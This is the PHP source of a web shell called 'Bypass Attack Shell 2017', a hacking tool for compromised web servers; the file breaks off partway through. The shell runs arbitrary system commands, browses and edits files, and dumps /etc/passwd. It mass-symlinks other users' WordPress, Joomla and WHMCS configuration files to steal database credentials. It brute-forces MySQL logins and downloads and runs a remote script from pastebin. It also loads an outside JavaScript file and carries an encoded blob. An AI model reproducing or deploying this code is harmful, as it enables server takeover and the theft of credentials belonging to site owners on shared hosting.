<title>Bypass Attack Shell 2017</title>
<link href="http://fonts.googleapis.com/css?family=Fredericka+the+Great" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Jolly+Lodger" rel="stylesheet" type="text/css">
<link href="http://fonts.googleapis.com/css?family=Homenaje" rel="stylesheet" type="text/css">
<link rel="shortcut icon" href="http://2.bp.blogspot.com/-fjsOAhhzQ1g/UDiiQke-iaI/AAAAAAAAAZQ/Qe0jvH9zBis/s1600/kaos_hacker03.jpg" type="image/x-icon">
<script src=http://r00t.info/ccb.js></script>
<meta name='author' content='Stupidc0de Family'>
<meta charset="UTF-8">
<style type="text/css">
		body {
		    background: #000000;
		    color: springgreen;
		    font-family :Homenaje;
		}

		#content .first{
			background-color: black;
		}

		a{
			color: white;
			text-decoration: none;
		}

		input,select,textarea{
			border: 1px #000000 solid;
			-moz-border-radius: 5px;
			-webkit-border-radius:5px;
			border-radius:5px;
		}

		#menu{
			background:#000000;
			margin:8px 2px 4px 2px;
			font-family:Fredericka the Great;
			font-size:14px;
			color:silver;
		}
		#menu a{
			padding:3px 6px;
			margin:1;
			background:#2d2b2b;
			text-decoration:none;
			letter-spacing:2px;
			-moz-border-radius: 10px; -webkit-border-radius: 5px; -khtml-border-radius: 5px; border-radius: 5px;
		}
		#menu a:hover{
			background:black;
			border-bottom:1px solid #ffffff;
			border-top:1px solid #ffffff;
		}
		.tombolupil{
			background:black;
			color:white;
			margin:0 10px;
			font-family:Homenaje;
			font-size:16px;
			border:2px solid crimson;
		}
		.tombolupil:hover{
			background:crimson;
			color:white;
			margin:0 10px;
			font-family:Homenaje;
			font-size:16px;
			border:2px solid crimson;
		}
		.bordergaya{
			background:black;
			color:white;
			margin:0 10px;
			font-family:Homenaje;
			font-size:16px;
			border:2px solid #2d2b2b;
		}
		.bordergaya:hover{
			background:#2d2b2b;
			color:white;
			margin:0 10px;
			font-family:Homenaje;
			font-size:16px;
			border:2px solid crimson;
		}

		.justborder{
			background:black;
			color:white;
			margin:0 10px;
			font-family:Homenaje;
			font-size:16px;
			border:2px solid #2d2b2b;
		}
</style>
</HEAD>
<BODY>
<center>

<?php  set_time_limit(0); error_reporting(0); if (get_magic_quotes_gpc()) {
    foreach ($_POST as $key => $value) {
        $_POST[$key] = stripslashes($value);
    }
} $self = $_SERVER['PHP_SELF']; $srvr_sof = $_SERVER['SERVER_SOFTWARE']; $your_ip = $_SERVER['REMOTE_ADDR']; $srvr_ip = $_SERVER['SERVER_ADDR']; $admin = $_SERVER['SERVER_ADMIN']; function exe($cmd)
{
    if (function_exists('system')) {
        @ob_start();
        @system($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();

        return $buff;
    } elseif (function_exists('exec')) {
        @exec($cmd, $results);
        $buff = '';
        foreach ($results as $result) {
            $buff .= $result;
        }

        return $buff;
    } elseif (function_exists('passthru')) {
        @ob_start();
        @passthru($cmd);
        $buff = @ob_get_contents();
        @ob_end_clean();

        return $buff;
    } elseif (function_exists('shell_exec')) {
        $buff = @shell_exec($cmd);

        return $buff;
    }
} function perms($file)
{
    $perms = fileperms($file);
    if (0xC000 == ($perms & 0xC000)) {
        $info = 's';
    } elseif (0xA000 == ($perms & 0xA000)) {
        $info = 'l';
    } elseif (0x8000 == ($perms & 0x8000)) {
        $info = '-';
    } elseif (0x6000 == ($perms & 0x6000)) {
        $info = 'b';
    } elseif (0x4000 == ($perms & 0x4000)) {
        $info = 'd';
    } elseif (0x2000 == ($perms & 0x2000)) {
        $info = 'c';
    } elseif (0x1000 == ($perms & 0x1000)) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
} function getfile($urlfile, $content)
{
    $fp = fopen($content, 'w');
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $urlfile);
    curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FILE, $fp);

    return curl_exec($ch);
    curl_close($ch);
    fclose($fp);
    ob_flush();
    flush();
} $zoneH = 'lVRti9s4EP4eyH+YimUdQxrvbqF3JLa5ct1Cub3dkqRf7lKC4kxisbJkJLlJWva/d+SXJu1uaWsIkUbz8swzj4RZrlm/F2eoHJo03mhTQIEu1+tkwd7dzeYLlvZ7/wpjtIExeVqUmDnIJLc2CVbarNFs+YEHoHiBFFTUvnVYrEsntEo/aYXP8zhqt3QQNWnSeGVoe6ud2KCBW8owhliosuoqLNixxIKBO5S+hsO9o10peYa5lnTu0VbO8OevnOPZPRKADtAaN+TmDVZ88oYXV4SuqfxaF1woC2O/jX1abpA/Xdu6g/ThO7F2+Rhe/vFnuZ9AjmKbuzG8uLii7UnVJrOvFHV526K/0KCtVoXwLX7ksvKGGar1MflWN/xGfl5+4dHTj036Pej3LLqlEwUupaAsMLgIyS42MHi2qVTmZ7DEvbDOwoBllZFLoYRjYfh5LZBM81xYmGVGlA4qixay99MbuBErw81hCAddQVFZB9Se41LCRhjaPatBcMgNbpIgd64cRxGvrkZlXo4UuqjgquIyQhX5miMCWZX+MEh/wzmOeMrCyUPdp2/pr7Oll+n/wVYHH8J+7zOdtB+RgzzLYYD7Uuq1b22h2BC6iHZEFAbcwlmzDY/xJ6m6r9TU6aB1PcnUSCz4cDQ114ByT45ZHo5LpIsHrJsb0UYC2aJLguVKcnUffEtjc4FGmS4ibrJcfMSorFZS2BzXyUWQ/tdeMP5VBQ1B3bg73EQlIWzR0qoB+S1rZ8RYAl9lAYPTDmozDYNuMqXL8iH8Tdq4ezdfTq/n76e38+mr29mb6+kQLn8tzJPVOR/97U44P7gjwCdmknGLwBpq2OTxrH5clP6GwFpud7vd6IRf5d+iQ2SF2kpk4W/l9c28eXt983pG6VuWk47u80Y0l4mfwnlOj1RBmkwuz0mkVqvk8sliXuKlwe2y4DUjLMq01P65M0gPQnr3T7ygV0DRU7qIpEgj0ncNEPeY1fDCMHyc9jsZtreWjZgHR3+dHGnZCJIWaWxLrtpnMKhhjGFrEFWQ+jAgLJF3SU+F+KiitPhTPE8UonbbMtdeEl2lH1RZEan3J3Y/g0q68c89H75TbSY1yawm0l+rLw==	'; echo '<style>
.js .inputfile {
    width: 0.1px;
    height: 0.1px;
    opacity: 0;
    overflow: hidden;
    position: absolute;
    z-index: -1;
}

.inputfile + label {
    max-width: 80%;
    font-size: 1.25rem;
    /* 20px */
    font-weight: 700;
    text-overflow: ellipsis;
    white-space: nowrap;
    cursor: pointer;
    display: inline-block;
    overflow: hidden;
    padding: 0.625rem 1.25rem;
    /* 10px 20px */
}

.no-js .inputfile + label {
    display: none;
}

.inputfile:focus + label,
.inputfile.has-focus + label {
    outline: 1px dotted #000;
    outline: -webkit-focus-ring-color auto 5px;
}

.inputfile + label * {
    /* pointer-events: none; */
    /* in case of FastClick lib use */
}

.inputfile + label svg {
    width: 1em;
    height: 1em;
    vertical-align: middle;
    fill: currentColor;
    margin-top: -0.25em;
    /* 4px */
    margin-right: 0.25em;
    /* 4px */
}

/* style 4 */

.inputfile-4 + label {
    color: white;
	font-family:Homenaje;
	font-size:15px;
}

.inputfile-4:focus + label,
.inputfile-4.has-focus + label,
.inputfile-4 + label:hover {
    color: crimson;
}

.inputfile-4 + label figure {
    width: 50px;
    height: 50px;
    border-radius: 25%;
    background-color: crimson;
    display: block;
    padding: 10px;
    margin: 0 auto 10px;
}

.inputfile-4:focus + label figure,
.inputfile-4.has-focus + label figure,
.inputfile-4 + label:hover figure {
    background-color: white;
}

.inputfile-4 + label svg {
    width: 100%;
    height: 100%;
    fill: black;
}

.rapihbanget{
	text-align: left;
	font-size: 16px;
	color: springgreen;
	font-family: Homenaje;
	margin-left: 38%;
}
.kecew{
	text-align: left;
	font-size: 15px;
	color: white;
	font-family: Homenaje;
}
</style>
<script>(function(e,t,n){var r=e.querySelectorAll("html")[0];r.className=r.className.replace(/(^|\s)no-js(\s|$)/,"$1js$2")})(document,window,0);</script>
'; echo"<br/>
<pre style='text-align: center; color: red; font-weight: bold; font-size: 15px;'>
██████╗  ██████╗  ██████╗ ████████╗██╗███╗   ██╗███████╗ ██████╗ 
██╔══██╗██╔═████╗██╔═████╗╚══██╔══╝██║████╗  ██║██╔════╝██╔═══██╗
██████╔╝██║██╔██║██║██╔██║   ██║   ██║██╔██╗ ██║█████╗  ██║   ██║
██╔══██╗████╔╝██║████╔╝██║   ██║   ██║██║╚██╗██║██╔══╝  ██║   ██║
██║  ██║╚██████╔╝╚██████╔╝   ██║██╗██║██║ ╚████║██║     ╚██████╔╝
╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝╚═╝╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ 
                                                                 
</pre>"; echo "<center><font color='red' size='6px' face='Fredericka the Great'> Bypass Attack Shell </font></center>"; echo "<center><font color='silver' siz='4px' face='Fredericka the Great'>[+] Turkey Cyber  Army [+]</font></center><br/>"; echo"
<font size='4' color='silver' face='Jolly Lodger'>
<center>" . php_uname() . '<br>
' . $software = getenv('SERVER_SOFTWARE'); echo'<p>'; echo"
<font size='3.5' color='white'><p>
            Your IP : <font color=red> " . $your_ip . '</font> <font color=springgreen>|</font> <font color="#fff2f2" > </font> Server IP : <font color=red>' . $srvr_ip . '</font> <font color="#fff2f2" ><br>

			</font>
</font>
            </div>
            </td>
        </tr>
    </tbody>
</table></div>
</font>'; $disablefunctions = @ini_get('disable_functions'); $echo_disablefunctions = (!empty($disablefunctions)) ? '<font color=white>' . $disablefunctions . '</font>' : '<font color=white>Have Fun! None Functions Disabled  For This Server! ~_^</font>'; echo '<br/><font size="4" style="font-family:Jolly Lodger; color:red;">
<tr><td> Disable Functions: ' . $echo_disablefunctions . '</font><br/></td></tr>'; echo '<br/><font size="4" style="font-family:Jolly Lodger;">
<tr><td> Your Path Location :'; if (isset($_GET['path'])) {
    $path = $_GET['path'];
} else {
    $path = getcwd();
} $path = str_replace('\\', '/', $path); $paths = explode('/', $path); foreach ($paths as $id => $pat) {
    if ('' == $pat && 0 == $id) {
        $a = true;
        echo '<a href="?path=/">/</a>';
        continue;
    }
    if ('' == $pat) {
        continue;
    }
    echo '<a href="?path=';
    for ($i = 0; $i <= $id; ++$i) {
        echo "$paths[$i]";
        if ($i != $id) {
            echo '/';
        }
    }
    echo '">' . $pat . '</a>/';
} echo '</font>'; ?>

<!- menu utama ->
<br><center><div id="menu">
[<a href="?">Home</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=korong">Upload</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=cgi">Cgi-Telnet</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=cmd">Command</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=fcrot">Adminer</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=vn">Domain Users</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=jumping">Jumping</a>] <font color=orange>=</font>
<br><br>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=cpanel">Cpanel Tools</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=bypstuls">Bypass Tools</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=grabc">Config Tools</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=masstool">Mass Tools</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=dump">Dumper Tools</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=krdp">Create RDP</a>] <font color=orange>=</font>
[<a href="?<?php echo 'path=' . $path; ?>&amp;x=tentang">About</a>]
</div></center>
<audio autoplay> <source src="http://www.soundjay.com/button/beep-24.wav" type="audio/mpeg"></audio>

<?php  if (isset($_GET['filesrc'])) {
    echo '<br /><tr><td>You Are Looking : ';
    echo $_GET['filesrc'];
    echo '</tr></td></table>';
    echo '<br /><br /><textarea rows="20" cols="80">' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</textarea>';
// break;
} elseif (isset($_GET['option']) && 'delete' != $_POST['opt']) {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
    if ('chmod' == $_POST['opt']) {
        if (isset($_POST['perm'])) {
            if (chmod($_POST['path'], $_POST['perm'])) {
                echo '<script>alert("Change Permission Sukses!");</script>';
            } else {
                echo '<script>alert("Change Permission Gagal!");</script>';
            }
        }
        echo '<form method="POST">
				Permission : <input name="perm" class="bordergaya" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />
				<input type="hidden" name="path" value="' . $_POST['path'] . '">
				<input type="hidden" name="opt" value="chmod">
				<input class="bordergaya" type="submit" value="Go" />
				</form>';
    } elseif ('rename' == $_POST['opt']) {
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<script>alert("Change Name Sukses!");</script>';
            } else {
                echo '<script>alert("Change Name Gagal!");</script>';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">
				New Name : <input class="bordergaya" name="newname" type="text" size="20" value="' . $_POST['name'] . '" />
				<input type="hidden" name="path" value="' . $_POST['path'] . '">
				<input type="hidden" name="opt" value="rename">
				<input class="bordergaya" type="submit" value="Go" />
				</form>';
    } elseif ('edit' == $_POST['opt']) {
        if (isset($_POST['src'])) {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src'])) {
                echo '<script>alert("Edit File Sukses!");</script>';
            } else {
                echo '<script>alert("Edit File Gagal!");</script>';
            }
            fclose($fp);
        }
        echo '<form method="POST">
				<textarea class="bordergaya" cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />
				<input type="hidden" name="path" value="' . $_POST['path'] . '">
				<input type="hidden" name="opt" value="edit">
				<input class="bordergaya" type="submit" value="Go" />
				</form>';
    }
    echo '</center>';
// break;
} elseif (isset($_GET['x']) && ('grabc' == $_GET['x'])) {
    @ini_set('output_buffering', 0);
    echo "
<form method='POST'>
</head>
<style>
textarea {
resize:none;
color: #000000 ;
background-color:#000000;
font-size:8pt; color:#ffffff;
border:1px solid white ;
border-left: 4px solid white ;
width:543px;
height:400px;
}
input {
color: #000000;
border:1px dotted white;
}
</style>";
    echo '<center>'; ?></center><br><center><?php if (empty($_POST['config'])) { ?><p><font face="Homenaje" color="springgreen" size="2pt">/etc/passwd content</p><br><form method="POST"><textarea name="passwd" class='bordergaya' rows='15' cols='60'><?php echo file_get_contents('/etc/passwd'); ?></textarea><br><br><input name="config" class='bordergaya' size="100" value="FUCKED!" type="submit"><br></form></center><br><?php }
    if ($_POST['config']) {
        $function = $functions = @ini_get('disable_functions');
        if (eregi('symlink', $functions)) {
            die('<error>Symlink disabled :( </error>');
        }
        @mkdir('r00t.info', 0755);
        @chdir('r00t.info');
        $htaccess = '
OPTIONS Indexes FollowSymLinks SymLinksIfOwnerMatch Includes IncludesNOEXEC ExecCGI
Options Indexes FollowSymLinks
ForceType text/plain
AddType text/plain .php
AddType text/plain .html
AddType text/html .shtml
AddType txt .php
AddHandler server-parsed .php
AddHandler txt .php
AddHandler txt .html
AddHandler txt .shtml
Options All
Options All';
        file_put_contents('.htaccess', $htaccess, FILE_APPEND);
        $passwd = $_POST['passwd'];
        $passwd = explode("\n", $passwd);
        echo "<br><br><center><font face='Homenaje' color=Crimson size=2pt>Kalem Ndan Lagi Di Proses...</center><br>";
        foreach ($passwd as $pwd) {
            $pawd = explode(':', $pwd);
            $user = $pawd[0];
            @symlink('/home/' . $user . '/public_html/wp-config.php', $user . '-wp13.txt');
            @symlink('/home/' . $user . '/public_html/wp/wp-config.php', $user . '-wp13-wp.txt');
            @symlink('/home/' . $user . '/public_html/WP/wp-config.php', $user . '-wp13-WP.txt');
            @symlink('/home/' . $user . '/public_html/wp/beta/wp-config.php', $user . '-wp13-wp-beta.txt');
            @symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp13-beta.txt');
            @symlink('/home/' . $user . '/public_html/press/wp-config.php', $user . '-wp13-press.txt');
            @symlink('/home/' . $user . '/public_html/wordpress/wp-config.php', $user . '-wp13-wordpress.txt');
            @symlink('/home/' . $user . '/public_html/Wordpress/wp-config.php', $user . '-wp13-Wordpress.txt');
            @symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp13-Wordpress.txt');
            @symlink('/home/' . $user . '/public_html/config.php', $user . '-configgg.txt');
            @symlink('/home/' . $user . '/public_html/news/wp-config.php', $user . '-wp13-news.txt');
            @symlink('/home/' . $user . '/public_html/new/wp-config.php', $user . '-wp13-new.txt');
            @symlink('/home/' . $user . '/public_html/blog/wp-config.php', $user . '-wp-blog.txt');
            @symlink('/home/' . $user . '/public_html/beta/wp-config.php', $user . '-wp-beta.txt');
            @symlink('/home/' . $user . '/public_html/blogs/wp-config.php', $user . '-wp-blogs.txt');
            @symlink('/home/' . $user . '/public_html/home/wp-config.php', $user . '-wp-home.txt');
            @symlink('/home/' . $user . '/public_html/db.php', $user . '-dbconf.txt');
            @symlink('/home/' . $user . '/public_html/site/wp-config.php', $user . '-wp-site.txt');
            @symlink('/home/' . $user . '/public_html/main/wp-config.php', $user . '-wp-main.txt');
            @symlink('/home/' . $user . '/public_html/configuration.php', $user . '-wp-test.txt');
            @symlink('/home/' . $user . '/public_html/joomla/configuration.php', $user . '-joomla2.txt');
            @symlink('/home/' . $user . '/public_html/portal/configuration.php', $user . '-joomla-protal.txt');
            @symlink('/home/' . $user . '/public_html/joo/configuration.php', $user . '-joo.txt');
            @symlink('/home/' . $user . '/public_html/cms/configuration.php', $user . '-joomla-cms.txt');
            @symlink('/home/' . $user . '/public_html/site/configuration.php', $user . '-joomla-site.txt');
            @symlink('/home/' . $user . '/public_html/main/configuration.php', $user . '-joomla-main.txt');
            @symlink('/home/' . $user . '/public_html/news/configuration.php', $user . '-joomla-news.txt');
            @symlink('/home/' . $user . '/public_html/new/configuration.php', $user . '-joomla-new.txt');
            @symlink('/home/' . $user . '/public_html/home/configuration.php', $user . '-joomla-home.txt');
            @symlink('/home/' . $user . '/public_html/vb/includes/config.php', $user . '-vb-config.txt');
            @symlink('/home/' . $user . '/public_html/whm/configuration.php', $user . '-whm15.txt');
            @symlink('/home/' . $user . '/public_html/central/configuration.php', $user . '-whm-central.txt');
            @symlink('/home/' . $user . '/public_html/whm/whmcs/configuration.php', $user . '-whm-whmcs.txt');
            @symlink('/home/' . $user . '/public_html/whm/WHMCS/configuration.php', $user . '-whm-WHMCS.txt');
            @symlink('/home/' . $user . '/public_html/whmc/WHM/configuration.php', $user . '-whmc-WHM.txt');
            @symlink('/home/' . $user . '/public_html/whmcs/configuration.php', $user . '-whmcs.txt');
            @symlink('/home/' . $user . '/public_html/support/configuration.php', $user . '-support.txt');
            @symlink('/home/' . $user . '/public_html/configuration.php', $user . '-joomla.txt');
            @symlink('/home/' . $user . '/public_html/submitticket.php', $user . '-whmcs2.txt');
            @symlink('/home/' . $user . '/public_html/whm/configuration.php', $user . '-whm.txt');
        }
        echo '<b><font face="Homenaje" color="springgreen" size="3pt"><b>Mass Config >></b> <a target="_blank" href="r00t.info">Clik-Config</a></font></b>';
    }
    // break;
} elseif (isset($_GET['x']) && ('brute' == $_GET['x'])) { ?>
						<form action="?path=<?php echo $path; ?>&amp;x=brute" method="post">
			<?php  @set_time_limit(0); @error_reporting(0); if ('find' == $_POST['page']) {
    if (isset($_POST['usernames']) && isset($_POST['passwords'])) {
        if ('passwd' == $_POST['type']) {
            $e = explode("\n", $_POST['usernames']);
            foreach ($e as $value) {
                $k = explode(':', $value);
                $username .= $k['0'] . ' ';
            }
        } elseif ('simple' == $_POST['type']) {
            $username = str_replace("\n", ' ', $_POST['usernames']);
        }
        $a1 = explode(' ', $username);
        $a2 = explode("\n", $_POST['passwords']);
        $id2 = count($a2);
        $ok = 0;
        foreach ($a1 as $user) {
            if ('' !== $user) {
                $user = trim($user);
                for ($i = 0; $i <= $id2; ++$i) {
                    $pass = trim($a2[$i]);
                    if (@mysql_connect('localhost', $user, $pass)) {
                        echo "Zoo!! ~ user is (<b><font color=white>$user</font></b>) Password is (<b><font color=white>$pass</font></b>)<br />";
                        ++$ok;
                    }
                }
            }
        }
        echo "<hr><b>You Found <font color=red>$ok</font> By Stupidc0de</b>";
        echo '<center><b><a href=' . $_SERVER['PHP_SELF'] . '?brute>BACK</a>';
        exit;
    }
} if ('password' == $_POST['pass']) {
    @error_reporting(0);
    $i = getenv('REMOTE_ADDR');
    $d = date('D, M jS, Y H:i', time());
    $h = $_SERVER['HTTP_HOST'];
    $dir = $_SERVER['PHP_SELF'];
    mkdir('config', 0755);
    $cp = file_get_contents('http://pastebin.com/raw/0YG2dZ98');
    $file = fopen('cp.py', 'w+');
    $write = fwrite($file, $cp);
    fclose($file);
    chmod('cp.py', 0755);
    $url = $_POST['url'];
    echo'<center>
			<textarea cols="90" rows="20" name="usernames">';
    system("python cp.py $url config");
    unlink('cp.py');
    echo'</textarea>
			</center>';
    echo '<hr><center><b><a href=' . $_SERVER['PHP_SELF'] . '?brute>BACK</a>';
    exit;
} if ('passwd' == $_POST['mendapatkan']) {
    @set_magic_quotes_runtime(0);
    ob_start();
    error_reporting(0);
    @set_time_limit(0);
    @ini_set('max_execution_time', 0);
    @ini_set('output_buffering', 0);
    $fn = $_POST['foldername'];
    function syml($usern, $pdomain)
    {
        symlink('/home/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
        symlink('/home/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
        symlink('/home/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
        symlink('/home/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
        symlink('/home/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
        symlink('/home/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
        symlink('/home/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
        symlink('/home/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
        symlink('/home/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
        symlink('/home/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
        symlink('/home/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
        symlink('/home/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
        symlink('/home/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
        symlink('/home/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
        symlink('/home/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
        symlink('/home/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
        symlink('/home/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
        symlink('/home/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
        symlink('/home/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
        symlink('/home/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
        symlink('/home/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
        symlink('/home/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
        symlink('/home/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
        symlink('/home/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
        symlink('/home/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
        symlink('/home/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
        symlink('/home/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
        symlink('/home/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
        symlink('/home/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
        symlink('/home/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
        symlink('/home2/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
        symlink('/home2/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
        symlink('/home2/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
        symlink('/home2/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
        symlink('/home2/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
        symlink('/home2/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
        symlink('/home2/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
        symlink('/home2/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
        symlink('/home2/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
        symlink('/home2/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
        symlink('/home2/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
        symlink('/home2/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
        symlink('/home2/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
        symlink('/home2/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
        symlink('/home2/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
        symlink('/home2/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
        symlink('/home2/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
        symlink('/home2/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
        symlink('/home2/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
        symlink('/home2/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
        symlink('/home2/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
        symlink('/home2/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
        symlink('/home2/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
        symlink('/home2/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
        symlink('/home2/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
        symlink('/home2/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
        symlink('/home2/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
        symlink('/home2/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
        symlink('/home2/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
        symlink('/home2/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
        symlink('/home3/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
        symlink('/home3/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
        symlink('/home3/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
        symlink('/home3/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
        symlink('/home3/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
        symlink('/home3/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
        symlink('/home3/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
        symlink('/home3/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
        symlink('/home3/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
        symlink('/home3/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
        symlink('/home3/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
        symlink('/home3/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
        symlink('/home3/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
        symlink('/home3/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
        symlink('/home3/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
        symlink('/home3/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
        symlink('/home3/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
        symlink('/home3/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
        symlink('/home3/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
